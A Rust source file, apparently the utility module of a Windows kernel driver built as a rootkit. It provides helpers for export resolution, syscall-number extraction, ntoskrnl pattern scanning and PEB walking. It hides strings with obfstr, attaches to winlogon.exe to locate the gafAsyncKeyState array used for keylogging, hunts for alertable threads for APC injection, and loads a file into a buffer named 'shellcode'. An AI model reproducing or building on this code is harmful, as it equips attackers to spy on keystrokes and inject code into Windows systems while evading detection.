use {
    crate::{
        includes::{structs::SystemModuleInformation, PsGetProcessPeb}, process::Process
    }, 
    alloc::{string::String, vec::Vec, vec}, 
    core::{
        ffi::{c_void, CStr}, 
        fmt::Write, 
        mem::{size_of, zeroed}, 
        ptr::{null_mut, read, read_unaligned}, 
        slice::from_raw_parts
    }, 
    ntapi::{
        ntexapi::{
            SystemModuleInformation, SystemProcessInformation, PSYSTEM_PROCESS_INFORMATION
        }, 
        ntldr::LDR_DATA_TABLE_ENTRY, 
        ntpebteb::PEB, 
        ntzwapi::ZwQuerySystemInformation
    }, 
    obfstr::obfstr, 
    wdk_sys::{
        ntddk::*, _FILE_INFORMATION_CLASS::FileStandardInformation, _SECTION_INHERIT::ViewUnmap,
        _POOL_TYPE::NonPagedPool, *
    }, 
    winapi::um::winnt::{
        RtlZeroMemory, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, 
        IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER
    },
};

#[cfg(not(test))]
extern crate wdk_panic;

#[cfg(not(test))]
use wdk_alloc::WDKAllocator;

#[cfg(not(test))]
#[global_allocator]
static GLOBAL_ALLOCATOR: WDKAllocator = WDKAllocator;

pub mod macros;
pub mod offsets;
pub mod uni;
pub mod ioctls;

/// Retrieves the input buffer from the given IO stack location.
///
/// # Parameters
/// - `stack`: A pointer to the `_IO_STACK_LOCATION` structure.
///
/// # Returns
/// - `Result<*mut T, NTSTATUS>`: A result containing the pointer to the input buffer or an NTSTATUS error code.
///
pub unsafe fn get_input_buffer<T>(stack: *mut _IO_STACK_LOCATION) -> Result<*mut T, NTSTATUS> {
    let input_buffer = (*stack).Parameters.DeviceIoControl.Type3InputBuffer;
    if input_buffer.is_null() {
        log::error!("Type3InputBuffer is null");
        Err(STATUS_INVALID_PARAMETER)
    } else {
        Ok(input_buffer as *mut T)
    }
}

/// Retrieves the output buffer from the given IRP.
///
/// # Parameters
/// - `irp`: A pointer to the `IRP` structure.
///
/// # Returns
/// - `Result<*mut T, NTSTATUS>`: A result containing the pointer to the output buffer or an NTSTATUS error code.
///
pub unsafe fn get_output_buffer<T>(irp: *mut IRP) -> Result<*mut T, NTSTATUS> {
    let output_buffer = (*irp).UserBuffer;
    if output_buffer.is_null() {
        log::error!("UserBuffer is null");
        Err(STATUS_INVALID_PARAMETER)
    } else {
        Ok(output_buffer as *mut T)
    }
}

/// Gets the base address of a specified module.
///
/// # Parameters
/// - `module_name`: A string slice containing the name of the module.
///
/// # Returns
/// - `Option<*mut c_void>`: An optional pointer to the base address of the module, or None if the module is not found.
///
pub unsafe fn get_module_base_address(module_name: &str) -> Option<*mut c_void> {
    let mut return_bytes = 0;
    ZwQuerySystemInformation(SystemModuleInformation, null_mut(), 0, &mut return_bytes);

    let info_module = ExAllocatePool(NonPagedPool, return_bytes as u64) as *mut SystemModuleInformation;
    if info_module.is_null() {
        log::error!("ExAllocatePool Failed");
        return None;
    }

    RtlZeroMemory(info_module as *mut winapi::ctypes::c_void, return_bytes as usize);

    let status = ZwQuerySystemInformation(
        SystemModuleInformation,
        info_module as *mut winapi::ctypes::c_void, 
        return_bytes, 
        &mut return_bytes
    );
    if !NT_SUCCESS(status) {
        log::error!("ZwQuerySystemInformation [2] Failed With Status: {status}");
        ExFreePool(info_module as _);
        return None;
    }

    let module_count = (*info_module).modules_count;

    for i in 0..module_count as usize {
        let name = (*info_module).modules[i].image_name;
        let module_base = (*info_module).modules[i].image_base as *mut c_void;
        if let Ok(name_str) = core::str::from_utf8(&name) {
            if name_str.contains(module_name) {
                return Some(module_base);
            }
        }
    }

    ExFreePool(info_module as _);
    None
}

/// Gets the address of a specified function within a module.
///
/// # Parameters
/// - `function_name`: A string slice containing the name of the function.
/// - `dll_base`: A pointer to the base address of the DLL.
///
/// # Returns
/// - `Option<*mut c_void>`: An optional pointer to the function's address, or None if the function is not found.
///
pub unsafe fn get_function_address(function_name: &str, dll_base: *mut c_void) -> Option<*mut c_void> {
    let dos_header = dll_base as *mut IMAGE_DOS_HEADER;
    let nt_header = (dll_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let export_directory = (dll_base as usize + (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let names = from_raw_parts((dll_base as usize + (*export_directory).AddressOfNames as usize) as *const u32, (*export_directory).NumberOfNames as _);
    let functions = from_raw_parts((dll_base as usize + (*export_directory).AddressOfFunctions as usize) as *const u32, (*export_directory).NumberOfFunctions as _);
    let ordinals = from_raw_parts((dll_base as usize + (*export_directory).AddressOfNameOrdinals as usize) as *const u16,(*export_directory).NumberOfNames as _);

    for i in 0..(*export_directory).NumberOfNames as isize {
        let name = CStr::from_ptr((dll_base as usize + names[i as usize] as usize) as *const i8).to_str().ok()?;
        let ordinal = ordinals[i as usize] as usize;
        let address = (dll_base as usize + functions[ordinal] as usize) as *mut c_void;
        if name == function_name {
            return Some(address);
        }
    }
    
    None
}

/// Get the address of the `gafAsyncKeyState` array within a module in the context of a target process.
///
/// # Parameters
/// - `name`: A string slice containing the name `gafAsyncKeyState`.
/// - `dll_base`: A pointer to the base address of the DLL.
///
/// # Returns
/// - `Option<*mut c_void>`: An optional pointer to the function's address, or None if the function is not found.
///
pub unsafe fn get_address_asynckey(name: &str, dll_base: *mut c_void) -> Option<*mut c_void> {
    let mut apc_state: KAPC_STATE = core::mem::zeroed(); 
    let pid = match get_process_by_name(obfstr!("winlogon.exe")) {
        Some(p) => p,
        None => return None
    };

    let target = match Process::new(pid) {
        Some(p) => p,
        None => return None
    };

    KeStackAttachProcess(target.e_process, &mut apc_state);

    let dll_base = dll_base as usize;
    let dos_header = dll_base as *mut IMAGE_DOS_HEADER;
    let nt_header = (dll_base + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let export_directory = (dll_base + (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let names = from_raw_parts((dll_base + (*export_directory).AddressOfNames as usize) as *const u32,(*export_directory).NumberOfNames as _);
    let functions = from_raw_parts((dll_base + (*export_directory).AddressOfFunctions as usize) as *const u32,(*export_directory).NumberOfFunctions as _);
    let ordinals = from_raw_parts((dll_base + (*export_directory).AddressOfNameOrdinals as usize) as *const u16, (*export_directory).NumberOfNames as _);

    for i in 0..(*export_directory).NumberOfNames as isize {
        let name_module = CStr::from_ptr((dll_base + names[i as usize] as usize) as *const i8).to_str().ok()?;
        let ordinal = ordinals[i as usize] as usize;
        let address = (dll_base + functions[ordinal] as usize) as *mut c_void;
        if name_module == name {
            KeUnstackDetachProcess(&mut apc_state);
            return Some(address);
        }
    }

    KeUnstackDetachProcess(&mut apc_state);
    
    None
}

/// Retrieves the PID of a process by its name.
///
/// # Parameters
/// - `process_name`: A string slice containing the name of the process.
///
/// # Returns
/// - `Option<usize>`: An optional containing the PID of the process, or None if the process is not found.
///
pub unsafe fn get_process_by_name(process_name: &str) -> Option<usize> {
    let mut return_bytes = 0;
    ZwQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_bytes);
    let info_process = ExAllocatePool(NonPagedPool, return_bytes as u64) as PSYSTEM_PROCESS_INFORMATION;
    if info_process.is_null() {
        log::error!("ExAllocatePool Failed");
        return None;
    }

    let status = ZwQuerySystemInformation(
        SystemProcessInformation,
        info_process as *mut winapi::ctypes::c_void,
        return_bytes,
        &mut return_bytes,
    );
    if !NT_SUCCESS(status) {
        log::error!("ZwQuerySystemInformation Failed With Status: {status}");
        return None;
    }

    let mut process_info = info_process;

    loop {
        if !(*process_info).ImageName.Buffer.is_null() {
            let image_name = from_raw_parts((*process_info).ImageName.Buffer, ((*process_info).ImageName.Length / 2) as usize);
            let name = String::from_utf16_lossy(image_name);
            if name == process_name {
                let pid = (*process_info).UniqueProcessId as usize;
                ExFreePool(info_process as *mut _);
                return Some(pid);
            }
        }

        if (*process_info).NextEntryOffset == 0 {
            break;
        }

        process_info = (process_info as *const u8).add((*process_info).NextEntryOffset as usize) as PSYSTEM_PROCESS_INFORMATION;
    }

    ExFreePool(info_process as _);
    None
}

/// Retrieves the syscall index for a given function name.
///
/// # Parameters
/// - `function_name`: The name of the function to retrieve the syscall index for.
///
/// # Returns
/// - `Option<u16>`: The syscall index if found, or `None` if an error occurs or the function is not found.
/// 
pub unsafe fn get_syscall_index(function_name: &str) -> Option<u16> {
    let mut section_handle = null_mut();
    let dll = crate::utils::uni::str_to_unicode("\\KnownDlls\\ntdll.dll");
    let mut obj_attr = InitializeObjectAttributes(Some(&mut dll.to_unicode()), OBJ_CASE_INSENSITIVE, None, None, None);
    let mut status = ZwOpenSection(&mut section_handle, SECTION_MAP_READ | SECTION_QUERY, &mut obj_attr);
    if !NT_SUCCESS(status) {
        log::error!("ZwOpenSection Failed With Status: {status}");
        return None
    }

    let mut large: LARGE_INTEGER = zeroed();
    let mut ntdll_addr = null_mut();
    let mut view_size = 0;
    status = ZwMapViewOfSection(
        section_handle, 
        0xFFFFFFFFFFFFFFFF as *mut core::ffi::c_void, 
        &mut ntdll_addr, 
        0, 
        0, 
        &mut large, 
        &mut view_size, 
        ViewUnmap, 
        0,
        PAGE_READONLY,
    );
    if !NT_SUCCESS(status) {
        log::error!("ZwMapViewOfSection Failed With Status: {status}");
        ZwClose(section_handle);
        return None
    }


    let dos_header = ntdll_addr as *const IMAGE_DOS_HEADER;
    let nt_header = (ntdll_addr as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;

    let ntdll_addr = ntdll_addr as usize;
    let export_directory = (ntdll_addr + (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let names = from_raw_parts((ntdll_addr + (*export_directory).AddressOfNames as usize) as *const u32, (*export_directory).NumberOfNames as _,);
    let functions = from_raw_parts((ntdll_addr + (*export_directory).AddressOfFunctions as usize) as *const u32, (*export_directory).NumberOfFunctions as _,);
    let ordinals = from_raw_parts((ntdll_addr + (*export_directory).AddressOfNameOrdinals as usize) as *const u16, (*export_directory).NumberOfNames as _);

    for i in 0..(*export_directory).NumberOfNames as isize {
        let name = CStr::from_ptr((ntdll_addr + names[i as usize] as usize) as *const i8).to_str().ok()?;
        let ordinal = ordinals[i as usize] as usize;
        let address = (ntdll_addr + functions[ordinal] as usize) as *const u8;
        if name == function_name {

            if read(address) == 0x4C
                && read(address.add(1)) == 0x8B
                && read(address.add(2)) == 0xD1
                && read(address.add(3)) == 0xB8
                && read(address.add(6)) == 0x00
                && read(address.add(7)) == 0x00 
            {
                let high = read(address.add(5)) as u16;
                let low = read(address.add(4)) as u16;
                let ssn = (high << 8) | low;

                ZwUnmapViewOfSection(0xFFFFFFFFFFFFFFFF as *mut c_void, ntdll_addr as *mut c_void);
                ZwClose(section_handle);
                return Some(ssn);
            }
        }
    }

    ZwUnmapViewOfSection(0xFFFFFFFFFFFFFFFF as *mut c_void, ntdll_addr as *mut c_void);
    ZwClose(section_handle);
    return None
}

/// Retrieves the address of a specified function within a module in the context of a target process.
///
/// # Parameters
/// - `pid`: The process ID (PID) of the target process.
/// - `module_name`: The name of the module (DLL) to be searched for. The search is case-insensitive.
/// - `function_name`: The name of the function within the module to be found.
/// 
/// # Returns
/// - `Option<*mut c_void>`: The address of the target function if found.
/// 
pub unsafe fn get_module_peb(pid: usize, module_name: &str, function_name: &str) -> Option<*mut c_void> {
    let mut apc_state: KAPC_STATE = core::mem::zeroed();
    let target = match Process::new(pid) {
        Some(p) => p,
        None => return None,
    };

    KeStackAttachProcess(target.e_process, &mut apc_state);
    let target_peb = PsGetProcessPeb(target.e_process) as *mut PEB;
    if target_peb.is_null() || (*target_peb).Ldr.is_null() {
        KeUnstackDetachProcess(&mut apc_state);
        return None;
    }
    
    let current = &mut (*(*target_peb).Ldr).InLoadOrderModuleList as *mut winapi::shared::ntdef::LIST_ENTRY;
    let mut next = (*(*target_peb).Ldr).InLoadOrderModuleList.Flink;      

    while next != current {
        if next.is_null() {
            log::error!("Next LIST_ENTRY is null");
            KeUnstackDetachProcess(&mut apc_state);
            return None;
        }

        let list_entry = next as *mut LDR_DATA_TABLE_ENTRY;
        if list_entry.is_null() {
            log::error!("LDR_DATA_TABLE_ENTRY is null");
            KeUnstackDetachProcess(&mut apc_state);
            return None;
        }

        let buffer = core::slice::from_raw_parts(
            (*list_entry).FullDllName.Buffer,
            ((*list_entry).FullDllName.Length / 2) as usize,
        );
        if buffer.is_empty() {
            log::error!("Buffer for module name is empty");
            KeUnstackDetachProcess(&mut apc_state);
            return None;
        }

        let dll_name = alloc::string::String::from_utf16(&buffer).ok()?;
        if dll_name.to_lowercase().contains(module_name) {
            let dll_base = (*list_entry).DllBase as usize;
            let dos_header = dll_base as *mut IMAGE_DOS_HEADER;
            let nt_header = (dll_base + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
        
            let export_directory = (dll_base + (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize) as *mut IMAGE_EXPORT_DIRECTORY;
            let names = from_raw_parts((dll_base + (*export_directory).AddressOfNames as usize) as *const u32,(*export_directory).NumberOfNames as _);
            let functions = from_raw_parts((dll_base + (*export_directory).AddressOfFunctions as usize) as *const u32,(*export_directory).NumberOfFunctions as _);
            let ordinals = from_raw_parts((dll_base + (*export_directory).AddressOfNameOrdinals as usize) as *const u16, (*export_directory).NumberOfNames as _);
        
            for i in 0..(*export_directory).NumberOfNames as isize {
                let name_module = CStr::from_ptr((dll_base + names[i as usize] as usize) as *const i8).to_str().ok()?;
                let ordinal = ordinals[i as usize] as usize;
                let address = (dll_base + functions[ordinal] as usize) as *mut c_void;
                if name_module == function_name {
                    KeUnstackDetachProcess(&mut apc_state);
                    return Some(address);
                }
            }
        }

        next = (*next).Flink;
    }

    KeUnstackDetachProcess(&mut apc_state);

    None
}

/// Scans memory for a specific pattern of bytes in a specific section.
/// # Parameters
/// - `base_addr`: The base address (in `usize` format) from which the scan should start.
/// - `section_name`: The name of the section to scan. This string must match the name of the section you want to scan.
/// - `pattern`: A slice of bytes (`&[u8]`) that represents the pattern you are searching for in memory.
/// 
/// # Returns
/// - `Option<*const u8>`: The address of the target function if found.
/// 
pub unsafe fn scan_for_pattern(base_addr: usize, section_name: &str, pattern: &[u8]) -> Option<*const u8> {
    let dos_header = base_addr as *const IMAGE_DOS_HEADER;
    let nt_header = (base_addr + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let section_header = (nt_header as usize + size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;

    for i in 0..(*nt_header).FileHeader.NumberOfSections as usize {
        let section = (*section_header.add(i)).Name;
        let name = core::str::from_utf8(&section).unwrap().trim_matches('\0');
        
        if name == section_name {
            let section_start = base_addr + (*section_header.add(i)).VirtualAddress as usize;
            let section_size = *(*section_header.add(i)).Misc.VirtualSize() as usize;
            let data = core::slice::from_raw_parts(section_start as *const u8, section_size);

            if let Some(offset) = data.windows(pattern.len()).position(|window| {
                window.iter().zip(pattern).all(|(d, p)| *p == 0xCC || *d == *p)
            }) {
                return Some((section_start + offset) as *const u8);
            }
        }
    }
    None
}

/// Finds the address of a specified Zw function.
/// 
/// # Parameters
/// - `name`: The name of the Zw function to find.
///
/// # Returns
/// - `Option<usize>`: The address of the Zw function if found, or `None` if an error occurs or the function is not found.
/// 
pub unsafe fn find_zw_function(name: &str) -> Option<usize> {
    let ssn = match get_syscall_index(name) {
        Some(ssn) => ssn,
        None => return None,
    };

    let ntoskrnl_addr = match get_module_base_address(obfstr!("ntoskrnl.exe")) {
        Some(addr) => addr,
        None => return None,
    };

    let ssn_bytes = ssn.to_le_bytes();
    let pattern: [u8; 30] = [
        0x48, 0x8B, 0xC4,            // mov rax, rsp
        0xFA,                        // cli
        0x48, 0x83, 0xEC, 0x10,      // sub rsp, 10h
        0x50,                        // push rax
        0x9C,                        // pushfq
        0x6A, 0x10,                  // push 10h
        0x48, 0x8D, 0x05, 0xCC, 0xCC, 0xCC, 0xCC, // lea rax, KiServiceLinkage
        0x50,                        // push rax
        0xB8, ssn_bytes[0], ssn_bytes[1], 0xCC, 0xCC, // mov eax, <SSN>
        0xE9, 0xCC, 0xCC, 0xCC, 0xCC // jmp KiServiceInternal
    ];
    
    let dos_header = ntoskrnl_addr as *const IMAGE_DOS_HEADER;
    let nt_header = (ntoskrnl_addr as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let section_header = (nt_header as usize + size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;

    for i in 0..(*nt_header).FileHeader.NumberOfSections as usize {
        let section = (*section_header.add(i)).Name;
        let name = core::str::from_utf8(&section).unwrap().trim_matches('\0');
        
        if name == obfstr!(".text") {
            let text_start = ntoskrnl_addr as usize + (*section_header.add(i)).VirtualAddress as usize;
            let text_end = text_start + *(*section_header.add(i)).Misc.VirtualSize() as usize;
            let data = core::slice::from_raw_parts(text_start as *const u8, text_end - text_start);

            if let Some(offset) = data.windows(pattern.len())
                .position(|window| {
                    window.iter().zip(&pattern).all(|(d, p)| *p == 0xCC || *d == *p)
                }) {
                
                return Some(text_start + offset);
            }
        }
    }

    return None
}

/// Find for a thread with an alertable status.
/// 
/// # Parameters
/// - `target_pid`: PID that will fetch the tids.
///
/// # Returns
/// - `Option<*mut _KTHREAD>`: The KTHREAD of the thread found, or `None` if an error occurs or the thread is not found.
/// 
pub unsafe fn find_thread_alertable(target_pid: usize) -> Option<*mut _KTHREAD> {
    let mut return_bytes = 0;
    ZwQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_bytes);
    let info_process = ExAllocatePool2(POOL_FLAG_NON_PAGED, return_bytes as u64, u32::from_be_bytes(*b"oied")) as PSYSTEM_PROCESS_INFORMATION;
    if info_process.is_null() {
        log::error!("ExAllocatePool2 Failed");
        return None;
    }

    let status = ZwQuerySystemInformation(
        SystemProcessInformation,
        info_process as *mut winapi::ctypes::c_void,
        return_bytes,
        &mut return_bytes,
    );
    if !NT_SUCCESS(status) {
        log::error!("ZwQuerySystemInformation Failed With Status: {status}");
        return None;
    }

    let mut process_info = info_process;
    while (*process_info).NextEntryOffset != 0 {
        let pid = (*process_info).UniqueProcessId as usize;
        if pid == target_pid {
            let threads_slice = from_raw_parts((*process_info).Threads.as_ptr(), (*process_info).NumberOfThreads as usize,);
            for &thread in threads_slice {
                let thread_id = thread.ClientId.UniqueThread as usize;
                let target_thread = match crate::thread::Thread::new(thread_id) {
                    Some(e_thread) => e_thread,
                    None => continue,
                };

                if PsIsThreadTerminating(target_thread.e_thread) == 1 {
                    continue;
                }

                let is_alertable = read_unaligned(target_thread.e_thread.cast::<u8>().offset(0x74) as *const u64) & 0x10;
                let is_gui_thread = read_unaligned(target_thread.e_thread.cast::<u8>().offset(0x78) as *const u64) & 0x80;
                let thread_kernel_stack = read_unaligned(target_thread.e_thread.cast::<u8>().offset(0x58) as *const u64);
                let thread_context_stack = read_unaligned(target_thread.e_thread.cast::<u8>().offset(0x268) as *const u64);

                if is_alertable == 0 && is_gui_thread != 0 && thread_kernel_stack == 0 && thread_context_stack == 0 {
                    continue;
                }

                log::info!("Thread Found: {thread_id}");
                return Some(target_thread.e_thread)
            }
        }
        
        if (*process_info).NextEntryOffset == 0 {
            break;
        }

        process_info = (process_info as *const u8).add((*process_info).NextEntryOffset as usize) as PSYSTEM_PROCESS_INFORMATION;
    }

    ExFreePool(info_process as *mut _);

    None
}

/// Initializes the OBJECT_ATTRIBUTES structure.
///
/// # Parameters
/// - `object_name`: The name of the object (optional).
/// - `attributes`: The attributes of the object.
/// - `root_directory`: The root directory (optional).
/// - `security_descriptor`: The security descriptor (optional).
/// - `security_quality_of_service`: The security quality of service (optional).
///
/// # Returns
/// - `OBJECT_ATTRIBUTES`: The initialized OBJECT_ATTRIBUTES structure
/// 
#[allow(non_snake_case)]
pub fn InitializeObjectAttributes(
    object_name: Option<*mut UNICODE_STRING>,
    attributes: u32,
    root_directory: Option<*mut c_void>,
    security_descriptor: Option<*mut c_void>,
    security_quality_of_service: Option<*mut c_void>
) -> OBJECT_ATTRIBUTES {
    OBJECT_ATTRIBUTES {
        Length: size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: root_directory.unwrap_or(null_mut()),
        ObjectName: object_name.unwrap_or(null_mut()),
        Attributes: attributes,
        SecurityDescriptor: security_descriptor.unwrap_or(null_mut()),
        SecurityQualityOfService: security_quality_of_service.unwrap_or(null_mut())
    }
}

/// Reads the content of a file given its path.
///
/// # Parameters
/// - `path`: The path to the file.
///
/// # Returns
/// - `Result<Vec<u8>, NTSTATUS>`: The content of the file as a vector of bytes if successful, or an NTSTATUS error code if an error occurs.
/// 
pub fn read_file(path: &String) -> Result<Vec<u8>, NTSTATUS> {
    let mut path_nt = String::new();
    write!(&mut path_nt, "\\??\\{}", path).unwrap();

    let file_name = crate::utils::uni::str_to_unicode(&path_nt);
    let mut io_status_block: _IO_STATUS_BLOCK = unsafe { zeroed() };
    let mut obj_attr = InitializeObjectAttributes(
        Some(&mut file_name.to_unicode()), 
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 
        None, 
        None, 
        None
    );

    let mut h_file: HANDLE = null_mut();
    let mut status = unsafe { 
        ZwCreateFile(
            &mut h_file,
            GENERIC_READ,
            &mut obj_attr,
            &mut io_status_block,
            null_mut(),
            FILE_ATTRIBUTE_NORMAL,
            0,
            FILE_OPEN,
            FILE_SYNCHRONOUS_IO_NONALERT,
            null_mut(),
            0,
        )
    };
    if !NT_SUCCESS(status) {
        log::error!("ZwCreateFile Failed With Status: {status}");
        return Err(status);
    }

    let mut file_info: FILE_STANDARD_INFORMATION = unsafe { zeroed() };
    status = unsafe { 
        ZwQueryInformationFile(
        h_file, 
        &mut io_status_block, 
        &mut file_info as *mut _ as *mut c_void, 
        size_of::<FILE_STANDARD_INFORMATION>() as u32, 
        FileStandardInformation
        )
    };
    if !NT_SUCCESS(status) {
        log::error!("ZwQueryInformationFile Failed With Status: {status}");
        unsafe { ZwClose(h_file) };
        return Err(status);
    }

    let file_size = unsafe { file_info.EndOfFile.QuadPart as usize };
    let mut byte_offset: LARGE_INTEGER = unsafe { zeroed() };
    byte_offset.QuadPart = 0;
    let mut shellcode = vec![0u8; file_size];
    status = unsafe { 
        ZwReadFile(
            h_file,
            null_mut(),
            None,
            null_mut(),
            &mut io_status_block,
            shellcode.as_mut_ptr() as *mut c_void,
            file_size as u32,
            &mut byte_offset,
            null_mut()
        )
    };
    if !NT_SUCCESS(status) {
        log::error!("ZwReadFile Failed With Status: {status}");
        unsafe { ZwClose(h_file) };
        return Err(status);
    }

    unsafe { ZwClose(h_file) };

    return Ok(shellcode)
}

/// Responsible for returning information on the modules loaded.
///
/// # Returns
/// - `Option<(*mut LDR_DATA_TABLE_ENTRY, i32)> `: Returns a content containing LDR_DATA_TABLE_ENTRY and the return of how many loaded modules there are in PsLoadedModuleList.
/// 
pub fn return_module() -> Option<(*mut LDR_DATA_TABLE_ENTRY, i32)> {
    let ps_module = crate::uni::str_to_unicode(obfstr!("PsLoadedModuleList"));
    let func = unsafe { MmGetSystemRoutineAddress(&mut ps_module.to_unicode()) as *mut LDR_DATA_TABLE_ENTRY };

    if func.is_null() {
        log::error!("PsLoadedModuleList is null");
        return None;
    }

    let mut list_entry = unsafe { (*func).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY };
    let mut module_count = 0;

    let start_entry = list_entry;
    while !list_entry.is_null() && list_entry != func {
        module_count += 1;
        list_entry = unsafe { (*list_entry).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY };
    }

    Some((start_entry, module_count))
}

/// Validates if the given address is within the kernel memory range.
///
/// # Parameters
/// - `addr`: A 64-bit unsigned integer representing the address to validate.
///
/// # Returns
/// - `bool`: True if the address is within the kernel memory range, False otherwise.
/// 
#[allow(dead_code)]
pub fn valid_kernel_memory(addr: u64) -> bool {
    addr > 0x8000000000000000 && addr < 0xFFFFFFFFFFFFFFFF
}